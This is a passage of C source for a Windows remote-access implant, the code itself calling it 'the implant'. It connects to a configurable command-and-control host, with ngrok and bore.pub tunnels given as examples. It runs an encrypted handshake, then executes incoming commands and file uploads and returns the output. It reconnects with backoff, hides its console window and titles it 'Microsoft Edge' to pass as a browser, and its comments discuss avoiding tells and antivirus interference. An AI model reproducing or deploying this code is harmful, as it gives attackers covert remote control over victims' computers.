 * logged "handshake failed", so a provider-side refusal was indistinguishable
 * from a wrong port or a PSK mismatch. */
static void log_peer_text(SOCKET sock, const char *stage)
{
    struct timeval tv;
    char   buf[256];
    int    n, i, printable = 0;

    tv.tv_sec  = 0;
    tv.tv_usec = 1500000;                 /* 1.5s: the refusal is already queued */
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof(tv));

    n = recv(sock, buf, (int)sizeof(buf) - 1, 0);
    if (n > 0) {
        buf[n] = 0;
        if (!(n >= 2 && (unsigned char)buf[0] == CYB_MAGIC0 &&
              (unsigned char)buf[1] == CYB_MAGIC1)) {
            for (i = 0; i < n; i++)
                if (buf[i] >= 0x20 && buf[i] < 0x7f) printable++;
            if (printable > n / 2) {
                /* Keep it on one line; the log is read with -Wait. */
                for (i = 0; i < n; i++)
                    if (buf[i] == '\r' || buf[i] == '\n') buf[i] = ' ';
                dbg("%s: peer replied in plain text: %s", stage, buf);
            } else {
                dbg("%s: peer sent %d bytes that are not a CYB3 frame", stage, n);
            }
        }
    } else if (n == 0) {
        dbg("%s: peer closed the connection without a CYB3 reply", stage);
    } else {
        /* 10054 = reset by peer, which is how a tunnel provider refuses once
         * it stops sending a readable reason. 10060 = timeout. */
        dbg("%s: no reply, WSA error %d", stage, WSAGetLastError());
    }

    tv.tv_sec = tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof(tv));
}

static int do_handshake(SOCKET sock, const uint8_t psk[32], cyb_session *sess)
{
    uint8_t auth[32];
    uint8_t priv[32], pub[32], nonce[16];
    uint8_t peer_pub[32], peer_nonce[16];
    uint8_t k_c2s[32], k_s2c[32], p_c2s[4], p_s2c[4];
    uint8_t frame[128], in[128];
    size_t  flen;
    int     i;

    cyb_derive_auth_key(auth, psk);
    cyb_x25519_keypair(priv, pub, NULL);
    if (cyb_random(nonce, sizeof(nonce)) != 0) return -1;

    flen = cyb_build_hello(frame, sizeof(frame), 0, auth, pub, nonce, NULL, NULL);
    if (!flen || send_all(sock, frame, flen) != 0) return -1;

    if (recv_exact(sock, in, flen) != 0) {
        log_peer_text(sock, "handshake: no HELLOACK");
        return -1;
    }
    if (in[0] != CYB_MAGIC0 || in[1] != CYB_MAGIC1 || in[2] != CYB_T_HELLOACK || in[3] != 0) {
        /* A provider that answered with its own error text lands here, because
         * that text is not framed the way a CYB3 reply is. */
        log_peer_text(sock, "handshake: unexpected reply");
        return -1;
    }
    if (cyb_ntohl32(in + 8) != CYB_HELLO_FRAME) return -1;
    if (cyb_verify_hello(in + CYB_HDR_LEN, CYB_HELLO_FRAME, 1, auth,
                         pub, nonce, peer_pub, peer_nonce) != 0)
        return -1;

    cyb_derive_session(k_c2s, k_s2c, p_c2s, p_s2c,
                       psk, priv, peer_pub, nonce, peer_nonce, 0);
    {
        uint8_t zero[4] = { 0, 0, 0, 0 };
        if (!memcmp(k_c2s, zero, 4) && !memcmp(k_s2c, zero, 4)) return -1;
    }

    cyb_session_init(sess);
    memcpy(sess->k_send, k_c2s, 32);
    memcpy(sess->k_recv, k_s2c, 32);
    memcpy(sess->n_send, p_c2s, 4);
    memcpy(sess->n_recv, p_s2c, 4);
    sess->established = 1;

    for (i = 0; i < 32; i++) { priv[i] = 0; peer_pub[i] = 0; }
    cyb_secure_zero(nonce, sizeof(nonce));
    cyb_secure_zero(k_c2s, sizeof(k_c2s));
    cyb_secure_zero(k_s2c, sizeof(k_s2c));
    return 0;
}

static void session_loop(SOCKET sock, const uint8_t psk[32])
{
    cyb_session s;
    uint8_t     rbuf[8192];
    uint8_t    *pt;
    size_t      ptlen;
    uint8_t     type;
    time_t      last_ping;
    int         disconnect = 0;
    int         r;

    cyb_session_init(&s);
    if (do_handshake(sock, psk, &s) != 0) {
        dbg("handshake failed");
        cyb_session_free(&s);
        return;
    }
    dbg("handshake ok");
    last_ping = time(NULL);

    while (!disconnect) {
        fd_set         rfds;
        struct timeval tv;
        time_t         now = time(NULL);

        if (now - last_ping >= PING_INTERVAL) {
            if (send_frame(&s, sock, CYB_T_PING, "p", 1) != 0) break;
            last_ping = now;
        }

        FD_ZERO(&rfds);
        FD_SET(sock, &rfds);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        r = select(0, &rfds, NULL, NULL, &tv);
        if (r < 0) {
            if (WSAGetLastError() == WSAEINTR) continue;
            break;
        }
        if (r == 0) continue;

        {
            int n = recv(sock, (char *)rbuf, (int)sizeof(rbuf), 0);
            if (n <= 0) {
                if (n < 0 && WSAGetLastError() == WSAEINTR) continue;
                dbg("recv returned %d", n);
                break;
            }
            if (cyb_feed(&s, rbuf, (size_t)n) != 0) { dbg("feed failed"); break; }
        }

        for (;;) {
            r = cyb_recv_next(&s, &type, &pt, &ptlen);
            if (r <= 0) {
                if (r < 0) { dbg("protocol violation, dropping link"); disconnect = 1; }
                break;
            }
            if (type == CYB_T_PING) {
                if (send_frame(&s, sock, CYB_T_PONG, pt, ptlen) != 0) { disconnect = 1; break; }
            } else if (type == CYB_T_PONG) {
                /* keepalive answered */
            } else if (type == CYB_T_BYE || type == CYB_T_ERR) {
                disconnect = 1;
                break;
            } else if (type == CYB_T_CMD) {
                cyb_ob out;
                char   cbuf[CMD_BUF];
                size_t  clen;

                g_disconnect = 0;
                ob_init(&out);

#if CYB_F_FS
                /* Binary upload frames bypass the dispatcher: the payload is
                 * raw bytes, not a NUL-terminated command line. */
                if (ptlen > 8 && memcmp(pt, "!upload ", 8) == 0) {
                    cmd_upload_raw(&out, pt, ptlen);
                } else
#endif
                {
                    clen = ptlen < CMD_BUF - 1 ? ptlen : CMD_BUF - 1;
                    memcpy(cbuf, pt, clen);
                    cbuf[clen] = 0;
                    handle_command(cbuf, &out);
                }
                {
                    size_t      olen;
                    const char *odata = ob_data(&out, &olen);
                    if (!g_disconnect && send_frame(&s, sock, CYB_T_RESP, odata, olen) != 0)
                        disconnect = 1;
                }
                ob_free(&out);
                if (g_disconnect) { disconnect = 1; break; }
            }
        }
    }

    cyb_secure_zero(&s, sizeof(s));
    cyb_session_free(&s);
}

static unsigned backoff_next(unsigned cur)
{
    unsigned lo = cur, hi;
    unsigned char b = 0;
    if (cyb_random(&b, 1) != 0) b = 0;
    if (lo < RECONNECT_MIN) lo = RECONNECT_MIN;
    if (lo > RECONNECT_MAX / 2) return RECONNECT_MAX;
    hi = lo * 2;
    return lo + (unsigned)((hi - lo) * ((unsigned)b % 100u) / 100u);
}

static void c2_loop(const char *host, int port, const uint8_t psk[32])
{
    unsigned delay = RECONNECT_MIN;
    dbg("c2_loop start host=%s port=%d", host, port);
    for (;;) {
        SOCKET s = tcp_connect(host, port);
        if (s == INVALID_SOCKET) {
            dbg("connect failed, retrying in %us", delay);
            Sleep(delay * 1000);
            delay = backoff_next(delay);
            continue;
        }
        delay = RECONNECT_MIN;
        capture_local_ip(s);
        session_loop(s, psk);
        closesocket(s);
        dbg("session ended, reconnecting in %us", RECONNECT_MIN);
        Sleep(RECONNECT_MIN * 1000);
    }
}

/* ------------------------------------------------------------------ */
/* entry                                                               */
/* ------------------------------------------------------------------ */

static void dbg(const char *fmt, ...)
{
    va_list ap;
    FILE   *out;
    char    path[MAX_PATH];
    DWORD   ts;
    int     n;

    if (!getenv("CYB_DEBUG")) return;

    /* This is a GUI-subsystem process, so stderr has no console attached and
     * vfprintf(stderr, ...) silently discards everything. Mirror to a log file
     * or the implant is completely opaque and cannot be debugged.
     * Destination: %CYB_DEBUG_LOG%, else %TEMP%\cybdbg.log. Deliberately not
     * the exe's own directory — that is often read-only and writing next to
     * the binary is a needless tell. */
    n = (int)GetEnvironmentVariableA("CYB_DEBUG_LOG", path, sizeof(path));
    if (n == 0 || n >= (int)sizeof(path)) {
        if (GetTempPathA(sizeof(path), path) == 0 ||
            lstrcatA(path, "cybdbg.log") >= path + sizeof(path)) {
            return;                     /* path did not fit; nothing to do */
        }
    }

    out = fopen(path, "ab");
    if (!out) return;                    /* e.g. AV blocked the write */

    ts = GetTickCount();
    fprintf(out, "[%8lu] ", (unsigned long)ts);
    va_start(ap, fmt);
    vfprintf(out, fmt, ap);
    va_end(ap);
    fputc('\n', out);
    fclose(out);
}

/* ------------------------------------------------------------------ */
/* endpoint resolution                                                 */
/* ------------------------------------------------------------------ */
/* The public tunnel endpoint changes every time the tunnel restarts --
 * ngrok hands out a random port, and switching between ngrok and bore.pub
 * changes both the host and the port. Baking it in with -DC2_PORT meant a
 * deployed implant kept dialling a dead port forever and there was no way to
 * repoint it short of a rebuild on the build host.
 *
 * cyb.cfg next to the exe decouples the two. Contents (all optional):
 *     C2_HOST=bore.pub
 *     C2_PORT=30185
 *
 * Precedence: environment variable > cyb.cfg > compiled-in default. Edit the
 * file and the same binary retargets.
 */

static void load_cfg(const char *exe_dir, const char **host, int *port)
{
    char  path[MAX_PATH];
    char  line[512];
    FILE *f;

    if (!exe_dir || !*exe_dir) return;
    if (snprintf(path, sizeof(path), "%s\\cyb.cfg", exe_dir) >= (int)sizeof(path))
        return;
    f = fopen(path, "r");
    if (!f) return;

    while (fgets(line, sizeof(line), f)) {
        char  key[64], val[256];
        char *p = line, *eq, *kend, *valp, *vend;

        while (*p == ' ' || *p == '\t') p++;
        if (*p == '#' || *p == ';' || *p == '\n' || *p == '\r' || !*p) continue;

        eq = strchr(p, '=');
        if (!eq) continue;

        /* Value lives after '='; the key is what precedes it. Deriving the
         * value from p+1 (rather than eq+1) silently yields an empty key for
         * any line written as "KEY = value". */
        valp = eq + 1;
        while (*valp == ' ' || *valp == '\t') valp++;

        /* Trim whitespace between the key and the '='. */
        kend = eq;
        while (kend > p && (kend[-1] == ' ' || kend[-1] == '\t')) kend--;
        *kend = 0;

        /* Trim the value's trailing whitespace, including the newline. */
        vend = valp + strlen(valp);
        while (vend > valp && (vend[-1] == '\n' || vend[-1] == '\r' ||
                               vend[-1] == ' '  || vend[-1] == '\t')) *--vend = 0;

        if (snprintf(key, sizeof(key), "%s", p) >= (int)sizeof(key)) continue;
        if (snprintf(val, sizeof(val), "%s", valp) >= (int)sizeof(val)) continue;

        if (!_stricmp(key, "C2_HOST") && *val) {
            *host = _strdup(val);        /* leaked deliberately: lives for the
                                           * whole process, freed at exit */
        } else if (!_stricmp(key, "C2_PORT")) {
            int v = atoi(val);
            if (v > 0 && v < 65536) *port = v;
        } else {
            dbg("cfg: ignoring unknown key '%s'", key);
        }
    }
    fclose(f);
    dbg("loaded cfg from %s", path);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                     LPSTR lpCmdLine, int nCmdShow)
{
    WSADATA     wsa;
    uint8_t     psk[32];
    const char *host = C2_HOST;
    int         port = C2_PORT;
    char       *env;
    char        exe_dir[MAX_PATH];

    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;

    /* Directory holding the exe, so cyb.cfg is found regardless of the CWD. */
    exe_dir[0] = 0;
    if (GetModuleFileNameA(NULL, exe_dir, sizeof(exe_dir))) {
        char *slash = strrchr(exe_dir, '\\');
        if (slash) *slash = 0; else exe_dir[0] = 0;
    }
    load_cfg(exe_dir, &host, &port);

    /* Configuration is resolved before anything scrubs the environment. */
    env = getenv("C2_HOST");
    if (env && *env) host = env;
    env = getenv("C2_PORT");
    if (env && *env) {
        int v = atoi(env);
        if (v > 0 && v < 65536) port = v;
    }

    /* Always log the endpoint actually in use. Every "it won't connect"
     * so far came down to a stale port, and nothing in the output said so. */
    dbg("endpoint resolved: %s:%d (exe dir: %s)", host, port, exe_dir);

    if (psk_from_hex(PSK_HEX, psk) != 0) memset(psk, 0, sizeof(psk));

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
    winsock_ready = 1;

    if (!getenv("CYB_NO_WINDOW")) {
        SetConsoleTitleA("Microsoft Edge");
        HWND h = GetConsoleWindow();
        if (h) ShowWindow(h, SW_HIDE);
    }

    if (!GetCurrentDirectoryA(MAX_PATH, current_dir)) current_dir[0] = 0;

    c2_loop(host, port, psk);

    cyb_secure_zero(psk, sizeof(psk));
    if (winsock_ready) WSACleanup();
    return 0;
}
